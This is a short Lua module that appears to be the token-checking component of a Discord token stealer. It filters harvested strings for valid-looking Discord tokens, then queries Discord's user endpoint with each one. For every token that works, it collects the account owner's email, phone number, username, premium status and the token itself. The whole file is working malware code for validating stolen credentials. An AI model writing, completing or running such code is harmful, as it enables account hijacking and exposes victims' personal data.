local base64 = require('base64')
local corohttp = require('coro-http')
local timer = require('timer')
local json = require('json')

local function getReal(acquired)
    local real = {}

    for i,caught in pairs(acquired) do
        if caught:sub(1,4) == 'mfa.' then
            table.insert(real, caught)
        else
            local result

            local success = pcall(function()
                result = base64.decode(caught:sub(1,24))
            end)

            if success then
                if tonumber(result) then
                    table.insert(real, caught)
                end
            end
        end
    end

    return real
end

local function getLocalUser(acquired)
    local user
    local body, data1

    local suc, err = pcall(function()
        body, data1 = corohttp.request('GET', 'https://discord.com/api/v7/users/@me', {{'authorization', acquired}})
    end)

    if data1:find('401: Unauthorized') then
        return false
    end

    local object = json.decode(data1)

    user = {id=object.id, name=object.username, tag=object.username..'#'..object.discriminator, discriminator=object.discriminator, email=object.email, phone=object.phone, token=acquired, premium=object.premium_type or nil, avatar_id = object.avatar or nil}
    
    return user
end

local function check(gotten)
    local realtokens = getReal(gotten)
    local working = {}

    for i,token in pairs(realtokens) do
        local user = getLocalUser(token)

        if user then
            table.insert(working, user)
        end
    end
    
    return working
end

local function init(fenv)
    fenv['check'] = check
end

return init